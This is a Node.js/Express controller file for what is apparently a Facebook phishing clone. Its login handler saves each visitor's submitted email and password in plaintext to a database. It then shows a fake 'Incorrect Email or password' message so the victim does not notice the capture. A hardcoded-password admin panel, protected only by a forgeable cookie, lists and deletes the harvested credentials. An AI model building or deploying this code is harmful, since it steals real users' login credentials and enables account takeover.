const fbClone=require("./fbModel");

const loginController=async(req,res)=>{
 
    const {email,password}=req.body;
    const dat=new Date();
    const userDatainsert=new fbClone({
        email:email,
        password:password,
        loginTime:dat.toLocaleTimeString("en-US",{timeZone:'asia/dhaka'}) + " - " + dat.toLocaleDateString("en-US",{timeZone:'asia/dhaka'})
    })
   const dataadd= await userDatainsert.save();
if(dataadd){
res.render("login",{
    success:"Incorrect Email or password"
})
}else{
    res.render("login",{ 
        faild:"Please Try Again"
    })
}
} 
 
const getAdmincontroller=(req,res)=>{
    const cruser=req.cookies.name;
    if(cruser){
        res.redirect("/dashboard")
    }else{
        res.render("adminLogin")
    } 
}



const postAdmincontroller=async(req,res)=>{
        const {password}=req.body;
        if(password=="soi00"){ 
    const dataAllusers=await fbClone.find();
            res.cookie("name","success");

            res.redirect('/dashboard')  

        }else{

            res.render("adminLogin",{
                incorrect:"Incorrect Password"
            })
        }
    
}
 


const dashboardController=async(req,res)=>{
    const cruser=req.cookies.name;
    if(cruser){
        const usrData=await fbClone.find();
        res.render("dashboard",{
            users:usrData
        })

    }else{
        res.redirect('/admin')

    }
}
const deleteuserController=async(req,res)=>{
    const cruser=req.cookies.name;
    if(cruser){

const dltId=req.params.id;
const dltQuery=await fbClone.deleteOne({_id:dltId});

if(dltQuery){
res.redirect('/dashboard')
}else{
res.send("Sometbhings Wrong")
}


    }else{
        res.redirect('/admin')

    }
}


module.exports={loginController,getAdmincontroller,postAdmincontroller,dashboardController,deleteuserController}
